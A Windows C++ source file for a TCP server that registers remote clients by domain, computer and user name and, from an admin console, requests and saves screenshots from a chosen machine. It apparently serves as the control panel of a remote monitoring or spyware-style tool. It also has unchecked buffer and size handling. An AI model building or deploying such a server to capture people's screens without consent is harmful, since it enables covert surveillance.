#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <thread>
#include <ctime>
#include <vector>
#include <algorithm>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

const int PORT = 12345;
const int BUFFER_SIZE = 4096;

struct ClientInfo {
    SOCKET socket;
    sockaddr_in address;
    time_t lastActive;
    std::string domain;
    std::string computerName;
    std::string ip;
    std::string userName;
};

std::vector<ClientInfo> clients;
CRITICAL_SECTION clientsCS;

void SaveScreenshot(const std::string& filename, const std::vector<char>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (file.is_open()) {
        file.write(data.data(), data.size());
        std::cout << "Screenshot saved to " << filename << std::endl;
    } else {
        std::cerr << "Failed to save screenshot to " << filename << std::endl;
    }
}

void HandleClient(SOCKET clientSocket, sockaddr_in clientAddr) {
    char buffer[BUFFER_SIZE];
    int bytes = recv(clientSocket, buffer, BUFFER_SIZE, 0);
    if (bytes <= 0) {
        closesocket(clientSocket);
        return;
    }
    
    buffer[bytes] = '\0';
    std::string clientData(buffer);
    
    size_t pos1 = clientData.find('|');
    size_t pos2 = clientData.find('|', pos1 + 1);
    size_t pos3 = clientData.find('|', pos2 + 1);
    
    if (pos1 == std::string::npos || pos2 == std::string::npos || pos3 == std::string::npos) {
        std::cerr << "Invalid client data format" << std::endl;
        closesocket(clientSocket);
        return;
    }
    
    ClientInfo info;
    info.domain = clientData.substr(0, pos1);
    info.computerName = clientData.substr(pos1 + 1, pos2 - pos1 - 1);
    info.ip = clientData.substr(pos2 + 1, pos3 - pos2 - 1);
    info.userName = clientData.substr(pos3 + 1);
    info.socket = clientSocket;
    info.address = clientAddr;
    info.lastActive = time(nullptr);
    
    EnterCriticalSection(&clientsCS);
    // Удаляем старую запись, если клиент переподключился
    clients.erase(std::remove_if(clients.begin(), clients.end(), 
        [&info](const ClientInfo& ci) { 
            return ci.computerName == info.computerName || ci.socket == info.socket;
        }), 
        clients.end());
    clients.push_back(info);
    LeaveCriticalSection(&clientsCS);
    
    std::cout << "New client: " << info.domain << "/" << info.computerName 
              << " (" << info.ip << ") user: " << info.userName << std::endl;
    
    while (true) {
        bytes = recv(clientSocket, buffer, BUFFER_SIZE, 0);
        if (bytes <= 0) {
            std::cout << "Client disconnected: " << info.computerName << std::endl;
            break;
        }
        
        if (bytes == 4 && strncmp(buffer, "PING", 4) == 0) {
            EnterCriticalSection(&clientsCS);
            for (auto& client : clients) {
                if (client.socket == clientSocket) {
                    client.lastActive = time(nullptr);
                    break;
                }
            }
            LeaveCriticalSection(&clientsCS);
        }
        else if (bytes >= 8 && strncmp(buffer, "SCRN", 4) == 0) {
            int size = *(int*)(buffer + 4);
            std::vector<char> imageData(size);
            
            int received = 0;
            while (received < size) {
                bytes = recv(clientSocket, imageData.data() + received, size - received, 0);
                if (bytes <= 0) {
                    std::cerr << "Error receiving screenshot data" << std::endl;
                    break;
                }
                received += bytes;
            }
            
            if (received == size) {
                std::string filename = "screenshot_" + info.computerName + "_" + 
                                     std::to_string(time(nullptr)) + ".jpg";
                SaveScreenshot(filename, imageData);
            } else {
                std::cerr << "Incomplete screenshot data received" << std::endl;
            }
        }
    }
    
    EnterCriticalSection(&clientsCS);
    clients.erase(std::remove_if(clients.begin(), clients.end(), 
        [clientSocket](const ClientInfo& ci) { return ci.socket == clientSocket; }), 
        clients.end());
    LeaveCriticalSection(&clientsCS);
    
    closesocket(clientSocket);
}

void AdminConsole() {
    while (true) {
        std::cout << "\nMenu:\n1. List clients\n2. Request screenshot\n3. Exit\nChoice: ";
        int choice;
        std::cin >> choice;
        
        if (choice == 1) {
            EnterCriticalSection(&clientsCS);
            if (clients.empty()) {
                std::cout << "No connected clients.\n";
            } else {
                std::cout << "\nConnected clients (" << clients.size() << "):\n";
                for (size_t i = 0; i < clients.size(); ++i) {
                    const auto& client = clients[i];
                    std::cout << i + 1 << ". " << client.computerName << " (" << client.ip << ")\n";
                    std::cout << "   Domain: " << client.domain << "\n";
                    std::cout << "   User: " << client.userName << "\n";
                    std::cout << "   Last active: " << ctime(&client.lastActive);
                }
            }
            LeaveCriticalSection(&clientsCS);
        }
        else if (choice == 2) {
            EnterCriticalSection(&clientsCS);
            if (clients.empty()) {
                std::cout << "No connected clients.\n";
                LeaveCriticalSection(&clientsCS);
                continue;
            }
            
            std::cout << "Select client (1-" << clients.size() << "):\n";
            for (size_t i = 0; i < clients.size(); ++i) {
                std::cout << i + 1 << ". " << clients[i].computerName << "\n";
            }
            std::cout << "Choice: ";
            
            int clientChoice;
            std::cin >> clientChoice;
            
            if (clientChoice < 1 || clientChoice > static_cast<int>(clients.size())) {
                std::cout << "Invalid choice.\n";
                LeaveCriticalSection(&clientsCS);
                continue;
            }
            
            SOCKET target = clients[clientChoice - 1].socket;
            const char* request = "SCRN";
            if (send(target, request, 4, 0) == SOCKET_ERROR) {
                std::cerr << "Failed to send screenshot request\n";
            } else {
                std::cout << "Screenshot request sent.\n";
            }
            LeaveCriticalSection(&clientsCS);
        }
        else if (choice == 3) {
            exit(0);
        }
    }
}

void AcceptConnections(SOCKET serverSocket) {
    while (true) {
        sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrSize);
        
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        std::thread(HandleClient, clientSocket, clientAddr).detach();
    }
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Добавлено: разрешаем повторное использование адреса
    int opt = 1;
    if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        std::cerr << "setsockopt failed: " << WSAGetLastError() << std::endl;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    InitializeCriticalSection(&clientsCS);
    std::cout << "Server started on port " << PORT << std::endl;

    std::thread admin(AdminConsole);
    admin.detach();

    AcceptConnections(serverSocket);

    DeleteCriticalSection(&clientsCS);
    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
